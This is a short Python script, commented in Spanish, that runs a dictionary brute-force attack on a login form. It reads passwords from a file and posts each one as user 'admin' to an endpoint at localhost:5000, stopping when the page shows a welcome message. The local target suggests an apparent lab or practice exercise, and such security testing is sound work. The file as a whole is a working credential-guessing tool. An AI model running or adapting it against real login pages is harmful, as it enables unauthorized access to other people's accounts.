import requests

URL = "http://localhost:5000/login"

USUARIO = "admin"

def probar_contraseñas():
    try:
        with open("contraseñas.txt", "r") as archivo:
            contraseñas = archivo.readlines()

        for contraseña in contraseñas:
            contraseña = contraseña.strip()  
            if not contraseña:
                continue

            try:
                respuesta = requests.post(URL, data={"username": USUARIO, "password": contraseña})

                if respuesta.status_code == 200 and "Bienvenido" in respuesta.text:
                    print(f"✅ Login exitoso con la contraseña: {contraseña}")
                    break
                else:
                    print(f"❌ Falló con: {contraseña}")

            except requests.RequestException as e:
                print(f"⚠️ Error en la conexión: {e}")

    except FileNotFoundError:
        print("⚠️ El archivo contraseñas.txt no existe.")
    except Exception as e:
        print(f"⚠️ Ocurrió un error inesperado: {e}")


if __name__ == "__main__":
    probar_contraseñas()
